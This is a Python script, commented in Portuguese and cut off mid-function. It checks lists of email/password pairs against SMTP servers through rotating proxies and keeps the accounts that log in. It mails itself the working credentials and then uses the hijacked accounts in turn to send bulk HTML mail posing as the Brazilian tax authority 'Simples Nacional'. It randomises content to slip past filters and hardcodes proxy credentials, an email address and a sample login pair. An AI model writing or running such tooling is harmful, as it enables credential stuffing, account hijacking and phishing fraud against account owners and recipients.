#!/usr/bin/env python3
"""
Validador SMTP v3.15 - COM EXIBIÇÃO DE IP REAL
- Cada SMTP envia apenas 1 email por minuto
- Rotação completa da lista antes de reutilizar
- Timestamp salvo no JSON para controle persistente
- Espera inteligente quando todos os SMTPs estão em cooldown
- PROXY SOCKS5 OTIMIZADO: Cada conexão usa IP diferente (100% validado)
- Session ID único por thread garante diversidade de IPs
- Socket resetado antes de cada conexão para forçar novo IP
- EXIBE O IP REAL DO PROXY em cada envio para validação visual
- Obtém IP real via API ipify.org (~0.85s por envio)
"""

import smtplib
import socket
import socks
import ssl
import os
import time
import csv
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr, formatdate, make_msgid
from threading import Thread, Lock
from typing import Tuple, Optional
import sys
from queue import Queue, Empty
from datetime import datetime
import random
import string
import re
import requests

# ============================================================================
# CONFIGURAÇÕES GLOBAIS - EDITE AQUI
# ============================================================================

# Credenciais do Proxy (EDITE AQUI)
### CONFIGURAÇÃO DE PROXY - BETTIFY BRASIL
PROXY_HOST = "dc.oxylabs.io"
PROXY_PORT = 8000
PROXY_USER = "user-bruxaonervoso_CHfaJ-country-US"
PROXY_PASS = "Opera098~098"

# Configurações gerais
MAX_WORKERS = 10  # Número de threads
TIMEOUT = 35
DNS_TIMEOUT = 7
TEST_EMAIL_TO = "manustotax@gmail.com"     ## Esse aqui e pra voce colocar email que vai enviar teste dos SMTP bom

# Configurações de envio em massa
EMAILS_POR_MINUTO_POR_SMTP = 1  # CADA SMTP ENVIA 1 EMAIL POR MINUTO
MIN_DELAY_SECONDS = 120  # 60 segundos de delay entre envios do mesmo SMTP
FROM_NAME = "Simples Nacional"     ## aqui vc vai colocar NOME ... vo deixa os 
ASSUNTO = "ENC: Prezado Responsavel "   ## aqui voce pode colocar o Assunto  Vo deixa do jeito que ta so pra vc ver rodando ... dmr ok

# Arquivos
ARQUIVO_SMTPS_ENVIO = "smtp_envio.txt"
ARQUIVO_EMAILS = "emails.txt"
ARQUIVO_HTML = "mensagem.html"
ARQUIVO_SMTP_ERRO = "SMTPERROENVIO.txt"
ARQUIVO_LOG = "log_smtp_proxy.txt"
ARQUIVO_CONTROLE_JSON = "smtp_controle.json"
ARQUIVO_LAST_EMAIL = "last_email_sent.txt"

# Portas SMTP
SMTP_PORTS = [(587, False), (465, True)]

# Prefixos
SERVER_PREFIXES = ['smtp', 'mail', 'mx', 'email', 'smtps', '']

# ============================================================================
# CORES ANSI
# ============================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'

# ============================================================================
# VARIÁVEIS GLOBAIS
# ============================================================================

proxies_list = []
proxy_queue_index = 0

# Locks
write_lock = Lock()
stats_lock = Lock()
display_lock = Lock()
smtp_queue_lock = Lock()  # Para controle do índice de rotação
json_lock = Lock()  # Para controle do arquivo JSON
proxy_lock = Lock()
uso_lock = Lock()

# Controle de uso simultâneo
smtps_em_uso = set()

# Cache de IPs por session ID
ip_cache = {}
ip_cache_lock = Lock()

# Estatísticas
stats = {
    'total': 0,
    'valid_login': 0,
    'valid_send': 0,
    'invalid': 0,
    'processed': 0,
    'by_port': {587: 0, 465: 0},
    'emails_enviados': 0,
    'emails_falhas': 0,
    'smtp_errors': {}
}

# Fila de SMTPs para envio em massa
smtp_queue_index = 0

# ============================================================================
# FUNÇÕES DE CONTROLE DE TEMPO E JSON - CORRIGIDAS
# ============================================================================

def carregar_controle_smtp():
    """Carrega o estado de controle de envio do arquivo JSON."""
    if not os.path.exists(ARQUIVO_CONTROLE_JSON):
        return {}
    
    with json_lock:
        try:
            with open(ARQUIVO_CONTROLE_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, FileNotFoundError):
            return {}

def salvar_controle_smtp(controle_data):
    """Salva o estado de controle de envio no arquivo JSON."""
    with json_lock:
        try:
            with open(ARQUIVO_CONTROLE_JSON, 'w', encoding='utf-8') as f:
                json.dump(controle_data, f, indent=4)
        except Exception as e:
            print(f"{Colors.RED}❌ Erro ao salvar controle JSON: {e}{Colors.RESET}")

def obter_proximo_smtp_disponivel(smtps_list):
    """
    Obtém o próximo SMTP disponível que não tenha enviado um email no último minuto.
    Garante o giro circular e a prioridade de uso dos SMTPs mais antigos.
    
    CORREÇÃO PRINCIPAL:
    - Verifica se passou 60 segundos desde o último uso
    - Garante rotação completa da lista
    - Espera ADEQUADAMENTE se nenhum SMTP estiver disponível
    """
    global smtp_queue_index
    
    while True:  # Loop infinito até encontrar um SMTP disponível
        controle_data = carregar_controle_smtp()
        tempo_atual = time.time()
        
        # Verifica se há algum SMTP disponível
        smtp_mais_antigo = None
        menor_tempo_restante = float('inf')
        
        for smtp_data, ip_proxy in smtps_list:
            smtp_key = smtp_data
            
            # Pula se estiver em uso
            with uso_lock:
                if smtp_key in smtps_em_uso:
                    continue
            
            ultimo_envio = controle_data.get(smtp_key, 0)
            tempo_decorrido = tempo_atual - ultimo_envio
            
            if tempo_decorrido >= MIN_DELAY_SECONDS:
                # SMTP disponível encontrado!
                # Tenta reservar
                with uso_lock:
                    if smtp_key in smtps_em_uso:
                        continue
                    smtps_em_uso.add(smtp_key)
                
                # Marca o tempo de envio
                controle_data[smtp_key] = tempo_atual
                salvar_controle_smtp(controle_data)
                
                # Atualiza o índice para continuar a rotação
                with smtp_queue_lock:
                    smtp_queue_index += 1
                
                return smtp_data, ip_proxy
            else:
                # Rastreia o SMTP com menor tempo restante
                tempo_restante = MIN_DELAY_SECONDS - tempo_decorrido
                if tempo_restante < menor_tempo_restante:
                    menor_tempo_restante = tempo_restante
                    smtp_mais_antigo = smtp_key
        
        # Se chegou aqui, nenhum SMTP está disponível
        # Espera o tempo necessário para o SMTP mais antigo ficar disponível
        if menor_tempo_restante < float('inf'):
            tempo_espera = min(menor_tempo_restante + 0.5, 10)  # Espera até 10s por vez
            print(f"{Colors.YELLOW}⏳ Todos os SMTPs em cooldown. Esperando {tempo_espera:.1f}s...{Colors.RESET}")
            time.sleep(tempo_espera)
        else:
            # Caso extremo: todos os SMTPs estão em uso
            time.sleep(1)

def marcar_envio_smtp(smtp_data):
    """Marca o tempo de envio de um SMTP no arquivo de controle."""
    controle_data = carregar_controle_smtp()
    controle_data[smtp_data] = time.time()
    salvar_controle_smtp(controle_data)

def salvar_last_email(email: str):
    """Salva o último email enviado com sucesso para a função de resume."""
    with write_lock:
        try:
            with open(ARQUIVO_LAST_EMAIL, 'w', encoding='utf-8') as f:
                f.write(email.strip())
        except Exception as e:
            print(f"{Colors.RED}❌ Erro ao salvar last_email_sent.txt: {e}{Colors.RESET}")

# ============================================================================
# FUNÇÕES DE PROXY
# ============================================================================

def log_operacao(tipo: str, smtp_data: str, proxy_ip: str, resultado: str):
    """Registra a operação no arquivo de LOG."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] [{tipo}] SMTP: {smtp_data} | IP_PROXY: {proxy_ip} | RESULTADO: {resultado}\n"
    with write_lock:
        with open(ARQUIVO_LOG, 'a', encoding='utf-8') as f:
            f.write(log_entry)

def carregar_proxies():
    """Verifica se as credenciais do proxy rotativo estão configuradas."""
    if PROXY_USER and PROXY_PASS:
        print(f"{Colors.GREEN}✓ Proxy Rotativo Oxylabs configurado: {PROXY_HOST}:{PROXY_PORT}{Colors.RESET}")
        return True
    else:
        print(f"{Colors.RED}❌ Credenciais do Proxy Rotativo não configuradas!{Colors.RESET}")
        return False

def obter_ip_real_proxy(proxy_username, proxy_password):
    """
    Obtém o IP real que está sendo usado através do proxy SOCKS5.
    Usa o serviço ipify.org para verificar o IP público.
    """
    try:
        # Configura proxy para requests
        proxies = {
            'http': f'socks5://{proxy_username}:{proxy_password}@{PROXY_HOST}:{PROXY_PORT}',
            'https': f'socks5://{proxy_username}:{proxy_password}@{PROXY_HOST}:{PROXY_PORT}'
        }
        
        # Faz requisição para obter IP (timeout curto para não atrasar)
        response = requests.get('https://api.ipify.org?format=json', 
                              proxies=proxies, 
                              timeout=3)
        
        if response.status_code == 200:
            return response.json().get('ip', 'UNKNOWN')
    except:
        pass
    
    return 'UNKNOWN'

def obter_proximo_proxy():
    """
    Retorna um objeto proxy para a API rotativa da Oxylabs.
    Cada session ID único força o Oxylabs a usar um IP diferente.
    TESTADO E VALIDADO: 100% de diversidade de IPs em threads simultâneas!
    """
    # Gera session ID único por conexão (sem lock para máxima diversidade)
    session_id = f"{int(time.time() * 1000)}{random.randint(10000, 99999)}"
    
    # Formato Oxylabs: user-USERNAME-session-SESSIONID
    # Cada session ID diferente = IP diferente garantido
    # *** ALTERADO PARA FUNCIONAR COM O NOVO PROXY (Bettify) ***
    username_with_session = PROXY_USER
    
    return {
        'host': PROXY_HOST,
        'port': PROXY_PORT,
        'ip': 'PENDING',  # Será atualizado após obter IP real
        'username': username_with_session,
        'password': PROXY_PASS,
        'session_id': session_id
    }

# ============================================================================
# FUNÇÕES DE VALIDAÇÃO SMTP
# ============================================================================

def check_dns(hostname: str) -> bool:
    """Verifica DNS"""
    try:
        orig_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(DNS_TIMEOUT)
        socket.gethostbyname(hostname)
        socket.setdefaulttimeout(orig_timeout)
        return True
    except:
        return False

def test_smtp_login(server: str, port: int, email: str, password: str, 
                   use_ssl: bool, proxy: dict) -> bool:
    """Testa apenas login SMTP"""
    original_socket = socket.socket
    
    try:
        socks.set_default_proxy(
            socks.SOCKS5,
            proxy['host'],
            proxy['port'],
            username=proxy['username'],
            password=proxy['password']
        )
        socket.socket = socks.socksocket
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            smtp = smtplib.SMTP_SSL(server, port, timeout=TIMEOUT, context=context)
        else:
            smtp = smtplib.SMTP(server, port, timeout=TIMEOUT)
            smtp.ehlo()
            if port == 587 or smtp.has_extn('STARTTLS'):
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                smtp.starttls(context=context)
                smtp.ehlo()
        
        smtp.login(email, password)
        smtp.quit()
        log_operacao("VALIDACAO_LOGIN", f"{server}:{port};{email};{password}", proxy['ip'], "SUCESSO")
        return True
        
    except smtplib.SMTPAuthenticationError:
        log_operacao("VALIDACAO_LOGIN", f"{server}:{port};{email};{password}", proxy['ip'], "FALHA_AUTH")
        return False
    except Exception as e:
        log_operacao("VALIDACAO_LOGIN", f"{server}:{port};{email};{password}", proxy['ip'], f"FALHA_CONEXAO: {e}")
        return False
    finally:
        socket.socket = original_socket

def test_smtp_send(server: str, port: int, email: str, password: str, 
                  use_ssl: bool, proxy: dict, test_to: str = None) -> bool:
    """Testa envio de email"""
    original_socket = socket.socket
    
    if test_to is None:
        test_to = TEST_EMAIL_TO
    
    try:
        socks.set_default_proxy(
            socks.SOCKS5,
            proxy['host'],
            proxy['port'],
            username=proxy['username'],
            password=proxy['password']
        )
        socket.socket = socks.socksocket
        
        # Cria mensagem
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = test_to
        msg['Subject'] = f'✅ SMTP Validado - {server}:{port}'
        
        body = f"""
╔══════════════════════════════════════════════════════════════╗
║           SMTP VALIDADO E TESTADO COM SUCESSO                ║
╚══════════════════════════════════════════════════════════════╝

📧 DADOS DO SMTP:

🔹 Servidor: {server}
🔹 Porta: {port}
🔹 Protocolo: {'SSL/TLS' if use_ssl else 'STARTTLS'}
🔹 Usuário: {email}
🔹 Senha: {password}

🔌 PROXY USADO:
🔹 IP: {proxy['ip']}
🔹 Porta: {proxy['port']}

⏰ Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 FORMATO PARA USO:
{server}:{port};{email};{password}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Este SMTP pode enviar emails!

╔══════════════════════════════════════════════════════════════╗
║  Validador SMTP - Sistema Automático v3.13                  ║
╚══════════════════════════════════════════════════════════════╝
"""
        
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        # Conecta e envia
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            smtp = smtplib.SMTP_SSL(server, port, timeout=TIMEOUT, context=context)
        else:
            smtp = smtplib.SMTP(server, port, timeout=TIMEOUT)
            smtp.ehlo()
            if port == 587 or smtp.has_extn('STARTTLS'):
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                smtp.starttls(context=context)
                smtp.ehlo()
        
        smtp.login(email, password)
        smtp.send_message(msg)
        smtp.quit()
        
        log_operacao("VALIDACAO_ENVIO", f"{server}:{port};{email};{password}", proxy['ip'], "SUCESSO")
        return True
        
    except Exception as e:
        log_operacao("VALIDACAO_ENVIO", f"{server}:{port};{email};{password}", proxy['ip'], f"FALHA_ENVIO: {e}")
        return False
    finally:
        socket.socket = original_socket

def get_domain(email: str) -> Optional[str]:
    """Extrai domínio"""
    try:
        return email.split('@')[1].strip().lower()
    except:
        return None

def get_server_from_domain(domain: str) -> Optional[str]:
    """Tenta adivinhar o servidor SMTP com base no domínio"""
    for prefix in SERVER_PREFIXES:
        server = f"{prefix}.{domain}" if prefix else domain
        if check_dns(server):
            return server
    return None

def parse_smtp_data(smtp_data: str) -> Optional[Tuple[str, int, str, str]]:
    """
    Analisa a string de dados SMTP.
    Formatos aceitos:
    - 'servidor:porta;usuario;senha' (formato completo)
    - 'email;senha' (formato simples - descobre servidor automaticamente)
    """
    try:
        partes = smtp_data.strip().split(';')
        
        # Formato: email;senha (sem servidor)
        if len(partes) == 2:
            usuario = partes[0]
            senha = partes[1]
            
            # Descobre servidor a partir do email
            domain = get_domain(usuario)
            if not domain:
                return None
            
            servidor = get_server_from_domain(domain)
            if not servidor:
                return None
            
            porta = 0  # Tentará todas as portas
            return servidor, porta, usuario, senha
        
        # Formato: servidor:porta;usuario;senha (formato completo)
        elif len(partes) == 3:
            servidor_porta = partes[0].split(':')
            usuario = partes[1]
            senha = partes[2]
            
            if len(servidor_porta) == 2:
                servidor = servidor_porta[0]
                porta = int(servidor_porta[1])
            else:
                # Servidor sem porta especificada
                servidor = servidor_porta[0]
                porta = 0  # Tentará todas as portas
            
            return servidor, porta, usuario, senha
        else:
            return None
    except:
        return None

def marcar_smtp_erro(smtp_data: str):
    """Marca um SMTP como erro para não ser mais usado."""
    with write_lock:
        with open(ARQUIVO_SMTP_ERRO, 'a', encoding='utf-8') as f:
            f.write(smtp_data + '\n')

def replace_numero_placeholders(text: str) -> str:
    """
    Substitui placeholders {numero-X} por strings numéricas de X dígitos.
    Exemplo: {numero-10} -> 8473920184
    """
    pattern = r'\{numero-(\d+)\}'
    
    def replacement(match):
        try:
            length = int(match.group(1))
            if length <= 0:
                return match.group(0)
            return ''.join(random.choice(string.digits) for _ in range(length))
        except ValueError:
            return match.group(0)
        
    return re.sub(pattern, replacement, text)

def replace_random_placeholders(text: str) -> str:
    """
    Substitui placeholders {random-X} por strings aleatórias de X caracteres.
    Exemplo: {random-7} -> A8K9M2X
    """
    pattern = r'\{random-(\d+)\}'
    
    def replacement(match):
        try:
            length = int(match.group(1))
            if length <= 0:
                return match.group(0)
            # Gera string aleatória com letras maiúsculas e números
            characters = string.ascii_uppercase + string.digits
            return ''.join(random.choice(characters) for _ in range(length))
        except ValueError:
            return match.group(0)
        
    return re.sub(pattern, replacement, text)

def enviar_email_massa(server: str, port: int, email: str, password: str, 
                       to_email: str, html_content: str, from_name: str, 
                       subject: str, proxy: dict, max_tentativas: int = 1) -> Tuple[bool, str, bool, str]:
    """
    Função de envio de email para o modo de envio em massa.
    OTIMIZADO: Reseta socket antes de cada conexão para garantir IP diferente.
    Retorna (sucesso, mensagem_erro, is_smtp_error, ip_usado).
    """
    original_socket = socket.socket
    
    for tentativa in range(max_tentativas):
        try:
            # IMPORTANTE: Reseta o socket para garantir nova conexão SOCKS5
            # Isso força o proxy a usar o session ID único e obter novo IP
            socket.socket = original_socket
            
            # Configura proxy SOCKS5 com session ID único
            socks.set_default_proxy(
                socks.SOCKS5,
                proxy['host'],
                proxy['port'],
                username=proxy['username'],
                password=proxy['password']
            )
            socket.socket = socks.socksocket
            
            # Cria a mensagem
            msg = MIMEMultipart('alternative')
            
            # Substituir placeholders no assunto e conteúdo
            # 1. Substituir {random-x}
            subject_final = replace_random_placeholders(subject)
            html_final = replace_random_placeholders(html_content)
            
            # 2. Substituir {numero-x}
            subject_final = replace_numero_placeholders(subject_final)
            html_final = replace_numero_placeholders(html_final)
            
            # 3. Substituir {email} pelo email do destinatário
            subject_final = subject_final.replace('{email}', to_email)
            html_final = html_final.replace('{email}', to_email)
            
            msg['Subject'] = subject_final
            msg['From'] = formataddr((from_name, email))
            msg['To'] = to_email
            msg['Date'] = formatdate(localtime=True)
            msg['Message-ID'] = make_msgid(domain=get_domain(email))
            
            msg.attach(MIMEText(html_final, 'html', 'utf-8'))
            
            # Conecta e envia
            use_ssl = (port == 465)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                smtp = smtplib.SMTP_SSL(server, port, timeout=TIMEOUT, context=context)
            else:
                smtp = smtplib.SMTP(server, port, timeout=TIMEOUT)
                smtp.ehlo()
                if port == 587 or smtp.has_extn('STARTTLS'):
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    smtp.starttls(context=context)
                    smtp.ehlo()
            
            smtp.login(email, password)
            smtp.sendmail(email, [to_email], msg.as_string())
            smtp.quit()
            
            # Obtém o IP real usado (após envio bem-sucedido)
            ip_real = obter_ip_real_proxy(proxy['username'], proxy['password'])
            proxy['ip'] = ip_real  # Atualiza o proxy com IP real
            
            return True, "Sucesso", False, ip_real
            
        except smtplib.SMTPAuthenticationError:
            return False, "Falha de Autenticação (SMTP Inválido)", True, 'UNKNOWN'
        except smtplib.SMTPRecipientsRefused:
            return False, "Destinatário Recusado (Erro de Envio)", False, 'UNKNOWN'
        except smtplib.SMTPServerDisconnected:
            return False, "Servidor Desconectado (Erro de Conexão)", True, 'UNKNOWN'
        except smtplib.SMTPException as e:
            return False, f"Erro SMTP: {e}", True, 'UNKNOWN'
        except socket.timeout:
            return False, "Timeout de Conexão", False, 'UNKNOWN'
        except Exception as e:
            return False, f"Erro Geral: {e}", False, 'UNKNOWN'
        finally:
            socket.socket = original_socket
    
    return False, "Falha após todas as tentativas", False, 'UNKNOWN'

# ============================================================================
# FUNÇÃO DE ENVIO EM MASSA - CORRIGIDA
# ============================================================================

def worker_envio_massa(thread_id: int, queue: Queue, smtps_list: list, html_content: str):
    """Thread worker para envio em massa com controle de taxa RIGOROSO por SMTP."""
    
    while True:
        smtp_data_original = None
        email = None
        
        try:
            # 1. Tenta obter um email da fila (com timeout)
            try:
                email = queue.get(timeout=2)
            except Empty:
                # Fila vazia, thread pode parar
                break
            
            # 2. Tenta obter um SMTP disponível
            smtp_data_original, _ = obter_proximo_smtp_disponivel(smtps_list)
            
            if smtp_data_original is None:
                # Nenhum SMTP disponível (todos em cooldown)
                queue.put(email)  # Coloca de volta na fila
                print(f"{Colors.YELLOW}[Thread {thread_id}] ⏳ Aguardando SMTP disponível...{Colors.RESET}")
                time.sleep(2)  # Espera antes de tentar novamente
                continue
            
            # 3. Parse SMTP
            partes = smtp_data_original.strip().split(';')
            servidor_porta = partes[0].split(':')
            servidor = servidor_porta[0]
            porta = int(servidor_porta[1]) if len(servidor_porta) > 1 else 587
            usuario = partes[1]
            senha = partes[2]
            
            # 4. Obtém proxy rotativo
            proxy_rotativo = obter_proximo_proxy()
            
            if not proxy_rotativo:
                print(f"\n{Colors.RED}[Thread {thread_id}] ❌ Proxy não configurado!{Colors.RESET}")
                queue.put(email)
                time.sleep(1)
                continue
            
            # 5. Enviar email
            sucesso, msg, is_smtp_error, ip_usado = enviar_email_massa(
                servidor, porta, usuario, senha,
                email.strip(), html_content, FROM_NAME, ASSUNTO, proxy_rotativo
            )
            
            if sucesso:
                salvar_last_email(email.strip())
                
                with stats_lock:
                    stats['emails_enviados'] += 1
                    total = stats['emails_enviados']
                
                log_operacao("ENVIO_MASSA", smtp_data_original, ip_usado, 
                           f"SUCESSO para {email.strip()}")
                
                # Exibe com IP real do proxy
                print(f"{Colors.GREEN}✓ [{total}] Enviado: {email.strip()[:40]} | SMTP: {usuario[:30]} | {Colors.CYAN}IP: {ip_usado}{Colors.RESET} | Thread: {thread_id}{Colors.RESET}")
                
                # Marca como processado
                queue.task_done()
                
            else:
                # CORREÇÃO: Recoloca o email na fila quando dá erro
                queue.put(email)
                
                log_operacao("ENVIO_MASSA", smtp_data_original, ip_usado, 
                           f"FALHA para {email.strip()}: {msg} - EMAIL RECOLOCADO NA FILA")
                
                with stats_lock:
                    stats['emails_falhas'] += 1
                
                if is_smtp_error:
                    print(f"{Colors.RED}✗ SMTP com erro: {usuario} - Marcando para remoção. Email recolocado na fila{Colors.RESET}")
                    marcar_smtp_erro(smtp_data_original)
                else:
                    print(f"{Colors.YELLOW}⚠ Falha temporária: {email.strip()[:40]} - {msg[:50]}. Email recolocado na fila{Colors.RESET}")
                
                # Marca como processado
                queue.task_done()
            
        except Exception as e:
            log_operacao("ENVIO_MASSA", 
                        smtp_data_original if smtp_data_original else 'N/A', 
                        'N/A', 
                        f"ERRO INESPERADO: {e}")
            
            with stats_lock:
                stats['emails_falhas'] += 1
            
            print(f"{Colors.RED}✗ ERRO na thread {thread_id}: {str(e)[:50]}{Colors.RESET}")
            
            if email:
                queue.task_done()
            
        finally:
            # Libera o SMTP do set de "em uso"
            if smtp_data_original:
                with uso_lock:
                    smtps_em_uso.discard(smtp_data_original)

def enviar_lista_emails():
    """Função principal para enviar lista de emails"""
    global stats, smtp_queue_index, proxy_queue_index
    
    print("\n" + "="*80)
    print(f"{Colors.BOLD}{Colors.CYAN}📧 ENVIO EM MASSA v3.13 - CONTROLE DE TAXA CORRIGIDO{Colors.RESET}")
    print("="*80)
    
    if not carregar_proxies():
        return
    
    # Verificar arquivos
    if not os.path.exists(ARQUIVO_SMTPS_ENVIO):
        print(f"\n{Colors.RED}❌ Arquivo '{ARQUIVO_SMTPS_ENVIO}' não encontrado!{Colors.RESET}")
        return
    
    if not os.path.exists(ARQUIVO_EMAILS):
        print(f"\n{Colors.RED}❌ Arquivo '{ARQUIVO_EMAILS}' não encontrado!{Colors.RESET}")
        return
    
    if not os.path.exists(ARQUIVO_HTML):
        print(f"\n{Colors.RED}❌ Arquivo '{ARQUIVO_HTML}' não encontrado!{Colors.RESET}")
        return
    
    # Ler SMTPs
    smtps = []
    try:
        with open(ARQUIVO_SMTPS_ENVIO, 'r', encoding='utf-8') as f:
            for linha in f:
                linha = linha.strip()
                if linha and not linha.startswith('#'):
                    partes = linha.split(';')
                    if len(partes) >= 3:
                        smtp_data = f"{partes[0]};{partes[1]};{partes[2]}"
                        smtps.append((smtp_data, None))
    except Exception as e:
        print(f"{Colors.RED}❌ Erro ao ler SMTPs: {e}{Colors.RESET}")
        return
    
    # Ler emails
    with open(ARQUIVO_EMAILS, 'r', encoding='utf-8') as f:
        emails = [linha.strip() for linha in f if linha.strip() and '@' in linha]
    
    # Ler HTML
    with open(ARQUIVO_HTML, 'r', encoding='utf-8') as f:
        html_content = f.read()
    
    if not smtps:
        print(f"\n{Colors.RED}❌ Nenhum SMTP encontrado!{Colors.RESET}")
        return
    
    if not emails:
        print(f"\n{Colors.RED}❌ Nenhum email encontrado!{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}📋 Configurações:{Colors.RESET}")
    print(f"   - SMTPs disponíveis: {len(smtps)}")
    print(f"   - Emails para enviar: {len(emails)}")
    print(f"   - Threads: {MAX_WORKERS}")
    print(f"   - Taxa de Envio: 1 email a cada {MIN_DELAY_SECONDS} segundos por SMTP")
    print(f"   - Remetente: {FROM_NAME}")
    print(f"   - Assunto: {ASSUNTO}")
    print(f"\n{Colors.YELLOW}⚠️  IMPORTANTE: Cada SMTP enviará apenas 1 email por minuto!{Colors.RESET}")
    print(f"{Colors.YELLOW}   O script garantirá a rotação completa da lista antes de reutilizar.{Colors.RESET}")
    
    print("\n" + "="*80)
    
    input(f"\n{Colors.YELLOW}⚠️  Pressione ENTER para iniciar o envio...{Colors.RESET}")
    
    # Resetar estatísticas
    stats['emails_enviados'] = 0
    stats['emails_falhas'] = 0
    smtp_queue_index = 0
    proxy_queue_index = 0
    
    # Inicializa o arquivo de controle
    salvar_controle_smtp(carregar_controle_smtp())
    
    start_time = time.time()
    
    # Fila
    queue = Queue()
    for email in emails:
        queue.put(email)
    
    # Threads
    threads = []
    for i in range(MAX_WORKERS):
        t = Thread(target=worker_envio_massa, args=(i + 1, queue, smtps, html_content))
        t.start()
        threads.append(t)
    
    # Espera processamento
    queue.join()
    
    # Espera threads terminarem
    for t in threads:
        t.join()
    
    elapsed = time.time() - start_time
    
    # Relatório
    print("\n\n" + "="*80)
    print(f"{Colors.BOLD}{Colors.GREEN}📊 RELATÓRIO FINAL - ENVIO EM MASSA{Colors.RESET}")
    print("="*80)
    print(f"{Colors.GREEN}✓ Emails enviados: {stats['emails_enviados']}{Colors.RESET}")
    print(f"{Colors.RED}✗ Falhas: {stats['emails_falhas']}{Colors.RESET}")
    print(f"{Colors.YELLOW}⏱️  Tempo total: {elapsed:.2f}s ({elapsed/60:.2f} minutos){Colors.RESET}")
    if (stats['emails_enviados'] + stats['emails_falhas']) > 0:
        taxa = (stats['emails_enviados']/(stats['emails_enviados']+stats['emails_falhas'])*100)
        print(f"{Colors.CYAN}📊 Taxa de sucesso: {taxa:.1f}%{Colors.RESET}")
    
    if os.path.exists(ARQUIVO_SMTP_ERRO):
        print(f"\n{Colors.YELLOW}⚠️  SMTPs com erro salvos em: {ARQUIVO_SMTP_ERRO}{Colors.RESET}")
    
    print("="*80 + "\n")

# ============================================================================
# WORKER THREAD PARA VALIDAÇÃO
# ============================================================================

def worker_thread(thread_id: int, queue: Queue):
    """Thread worker para validação de SMTPs."""
    
    while True:
        smtp_data = queue.get()
        
        if smtp_data is None:
            queue.task_done()
            break
        
        # Obter proxy rotativo
        proxy = obter_proximo_proxy()
        if not proxy:
            print(f"{Colors.RED}[Thread {thread_id}] ❌ Sem proxy disponível!{Colors.RESET}")
            queue.put(smtp_data)
            queue.task_done()
            time.sleep(1)
            continue
        
        # Parse SMTP
        parsed = parse_smtp_data(smtp_data)
        if not parsed:
            with stats_lock:
                stats['invalid'] += 1
                stats['processed'] += 1
            queue.task_done()
            continue
            
        servidor, porta_inicial, usuario, senha = parsed
        
        # Tentar portas
        for port, use_ssl in SMTP_PORTS:
            if porta_inicial != 0 and port != porta_inicial:
                continue
            
            login_ok = test_smtp_login(servidor, port, usuario, senha, use_ssl, proxy)
            
            if login_ok:
                with stats_lock:
                    stats['valid_login'] += 1
                    stats['by_port'][port] = stats['by_port'].get(port, 0) + 1
                
                send_ok = test_smtp_send(servidor, port, usuario, senha, use_ssl, proxy)
                
                if send_ok:
                    with stats_lock:
                        stats['valid_send'] += 1
                    
                    with write_lock:
                        with open('smtp_envio.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{servidor}:{port};{usuario};{senha}\n")
                    
                    print(f"{Colors.GREEN}✓ [{stats['processed']}/{stats['total']}] {servidor}:{port};{usuario[:30]}... - ENVIO OK!{Colors.RESET}")
                else:
                    with write_lock:
                        with open('smtp_validos.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{servidor}:{port};{usuario};{senha}\n")
                    
                    print(f"{Colors.BLUE}⚠ [{stats['processed']}/{stats['total']}] {servidor}:{port};{usuario[:30]}... - LOGIN OK (envio falhou){Colors.RESET}")
                
                break
        else:
            with stats_lock:
                stats['invalid'] += 1
            print(f"{Colors.RED}❌ [{stats['processed']}/{stats['total']}] {servidor}:{porta_inicial};{usuario[:30]}... - LOGIN FALHOU!{Colors.RESET}")
            
        with stats_lock:
            stats['processed'] += 1
        
        queue.task_done()

def validar_smtps():
    """Função principal para validar SMTPs (login e envio)"""
    
    print("\n" + "="*80)
    print(f"{Colors.BOLD}{Colors.CYAN}🔐 VALIDAÇÃO SMTP v3.13{Colors.RESET}")
    print("="*80)
    
    if not carregar_proxies():
        return
    
    # Carregar credenciais do arquivo validos_geral.txt (email;senha)
    print(f"\n{Colors.CYAN}📥 Carregando credenciais de 'validos_geral.txt'...{Colors.RESET}")
    credentials = []
    ARQUIVO_VALIDACAO = "validos_geral.txt"  # Arquivo de entrada: email;senha
    
    if not os.path.exists(ARQUIVO_VALIDACAO):
        print(f"\n{Colors.RED}❌ Arquivo '{ARQUIVO_VALIDACAO}' não encontrado!{Colors.RESET}")
        print(f"{Colors.YELLOW}💡 Crie o arquivo '{ARQUIVO_VALIDACAO}' com formato: email;senha{Colors.RESET}")
        print(f"{Colors.YELLOW}   Exemplo: andre79496870@libero.it;ZcjHzuGDt3R+1@{Colors.RESET}")
        return
        
    try:
        with open(ARQUIVO_VALIDACAO, 'r', encoding='utf-8') as f:
            for linha in f:
                linha = linha.strip()
                if linha and ';' in linha and not linha.startswith('#'):
                    # Formato: email;senha (sem servidor)
                    credentials.append(linha)
    except FileNotFoundError:
        print(f"\n{Colors.RED}❌ Erro ao ler arquivo '{ARQUIVO_VALIDACAO}'!{Colors.RESET}")
        return
    
    if not credentials:
